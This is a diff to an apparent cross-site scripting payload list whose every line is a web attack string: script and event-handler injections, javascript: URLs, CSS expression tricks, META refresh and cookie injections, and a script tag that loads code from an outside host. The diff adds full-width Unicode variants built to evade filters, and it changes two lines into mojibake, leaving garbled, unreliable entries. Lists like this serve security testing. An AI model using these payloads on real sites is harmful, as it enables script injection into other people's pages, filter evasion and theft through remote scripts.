@@ -11,7 +11,7 @@ dnd --><script>alert(9)</script><!--%20
 <input value=''onfocus=alert(9);a=''>
 <a href="javascript:alert(9)">atul t</a>
 "><iframe src='' onload=alert('atul')>
-a=’a%3D&b=+’><img+src%3Da+onerror%3Dalert(9)//
+a=â€™a%3D&b=+â€™><img+src%3Da+onerror%3Dalert(9)//
 <a href="http://"/><script>alert('zombie')</script>@www.grayhat.in/">hackers</a>
 <script>alert(9)</script<br>
 <svg onload="javascript:alert(9)" xmlns="http://www.w3.org/2000/svg"></svg>
@@ -108,7 +108,7 @@ exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
 <STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
 <STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
 <XSS STYLE="behavior: url(xss.htc);">
-¼script¾alert(¢XSS¢)¼/script¾
+Â¼scriptÂ¾alert(Â¢XSSÂ¢)Â¼/scriptÂ¾
 <META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
 <META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
 <META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
@@ -130,3 +130,6 @@ a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);
 <!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
 <? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
 <META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
+Half-Width/Full-Width Characters##< s c r i p t > p r o m p t ( 1 ) < / s c r i p t >##1
+Half-Width/Full-Width Unicode -1##\uff1c\uff53\uff43\uff52\uff49\uff50\uff54\uff1e\uff41\uff4c\uff45\uff52\uff54\uff08\uff07\uff58\uff53\uff53\uff07\uff09\uff1c\uff0f\uff53\uff43\uff52\uff49\uff50\uff54\uff1e##1
+Half-Width/Full-Width Unicode -2##%uff1c%uff53%uff43%uff52%uff49%uff50%uff54%uff1e%uff41%uff4c%uff45%uff52%uff54%uff08%uff07%uff58%uff53%uff53%uff07%uff09%uff1c%uff0f%uff53%uff43%uff52%uff49%uff50%uff54%uff1e##1
